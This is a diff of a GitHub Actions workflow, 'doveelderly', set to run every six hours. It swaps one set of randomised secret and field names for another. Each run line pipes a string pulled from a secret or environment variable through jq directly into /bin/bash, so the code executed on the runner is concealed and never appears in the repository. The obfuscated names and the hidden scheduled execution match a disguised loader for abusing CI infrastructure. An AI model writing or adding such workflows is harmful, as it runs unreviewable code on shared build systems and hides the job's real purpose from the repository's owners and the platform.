@@ -3,27 +3,25 @@ name: doveelderly
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 1/6 * * *'
-jobs:  # 25279
+    - cron: '38 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: doveelderly
         env:
-          oa47363: ${{ secrets.oa47363 }}
+          ckbk01924: ${{ secrets.ckbk01924 }}
         run: |
-          echo $oa47363 | jq -r .woh69797 | /bin/bash
-          echo $boyuz5 | jq -r .quv84866 | /bin/bash
-          echo $eed863 | jq -r .tzca2 | /bin/bash
-          echo $yhz624 | jq -r .cg5 | /bin/bash
-          echo $rdcp812 | jq -r .aohxp97359 | /bin/bash
-          echo $svae96422 | jq -r .gnon322 | /bin/bash
-          echo $ymf13 | jq -r .yz80596 | /bin/bash
-          echo $cljs31 | jq -r .p76319 | /bin/bash
-          echo $jut4678 | jq -r .jex2 | /bin/bash
-          echo $l7 | jq -r .qsfu303 | /bin/bash
-          echo $hchz32876 | jq -r .pxa8110 | /bin/bash
-          echo $w32204 | jq -r .bnee3 | /bin/bash
+          echo $ckbk01924 | jq -r .phy8351 | /bin/bash
+          echo $x9199 | jq -r .ydlbb348 | /bin/bash
+          echo $m00 | jq -r .evie666 | /bin/bash
+          echo $ytc858 | jq -r .zavq234 | /bin/bash
+          echo $cuqy118 | jq -r .yw8 | /bin/bash
+          echo $hjv52 | jq -r .n312 | /bin/bash
+          echo $xfwc83 | jq -r .tqk2 | /bin/bash
+          echo $bpi5 | jq -r .tl05503 | /bin/bash
+          echo $uvi4 | jq -r .cvopr7973 | /bin/bash
+          echo $ji2553 | jq -r .rvx491 | /bin/bash
+          echo $hxn87794 | jq -r .ozhx16173 | /bin/bash
 
